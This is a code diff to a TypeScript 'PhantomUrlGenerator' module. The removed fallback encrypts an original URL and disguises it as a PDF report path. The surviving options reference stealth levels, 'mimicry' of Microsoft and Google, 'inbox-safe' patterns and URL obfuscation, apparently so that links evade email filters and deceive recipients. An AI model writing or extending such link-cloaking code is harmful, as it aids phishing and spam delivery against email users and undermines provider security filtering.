@@ -4,9 +4,17 @@ import { centralizedUrlProcessor } from './services/centralizedUrlProcessor';
 import { rateLimitingService } from './services/rateLimitingService';
 import { cacheManager } from './cacheManager';
 import { optionalAnalytics } from './optionalAnalytics';
-import { getLocalPatterns } from '@/data/localPatterns';
-import { hybridPatternManager } from './hybridPatternManager';
 import { InboxSafePatternManager, PatternSelectionCriteria } from './patterns/inboxSafePatternManager';
+import { supabase } from '@/integrations/supabase/client';
+import { auditLoggingService } from './services/auditLoggingService';
+
+// Pattern context interface for legacy compatibility
+export interface PatternContext {
+  category?: string;
+  industry?: string;
+  targetProvider?: string;
+  tier?: number;
+}
 
 export interface PhantomUrlOptions {
   pattern?: 'document' | 'business' | 'content' | 'legacy' | 'auto' | 'intelligent' | 'microsoft' | 'google' | 'mimicry';
@@ -297,36 +305,7 @@ export class PhantomUrlGenerator {
   }
 
 
-  /**
-   * Emergency fallback if database patterns fail
-   */
-  private async generateEmergencyFallbackPattern(
-    originalUrl: string, 
-    licenseKeyId: string, 
-    options: { stealthLevel: string; encryptionMode: string }
-  ): Promise<PhantomUrlResult> {
-    console.warn('Using emergency fallback pattern generation');
-    
-    const encryptionResult = await enhancedEncryption.encryptUrl(
-      originalUrl, 
-      licenseKeyId, 
-      '/documents/report-{year}.pdf?doc={encrypted}',
-      options.encryptionMode as 'aes' | 'xor' | 'auto'
-    );
-
-    const year = new Date().getFullYear().toString();
-    const fallbackUrl = `/documents/report-${year}.pdf?doc=${encryptionResult.encrypted}`;
-
-    return {
-      url: fallbackUrl,
-      pattern: 'emergency-fallback',
-      tier: 1,
-      expectedSuccessRate: 75, // Conservative estimate
-      contentType: 'application/pdf',
-      encryptionMode: encryptionResult.mode,
-      securityLevel: 5
-    };
-  }
+  // Removed old emergency fallback - using inbox-safe patterns only
 
   private applyPlanAObfuscation(encrypted: string): string {
     // Add time-based salt prefix
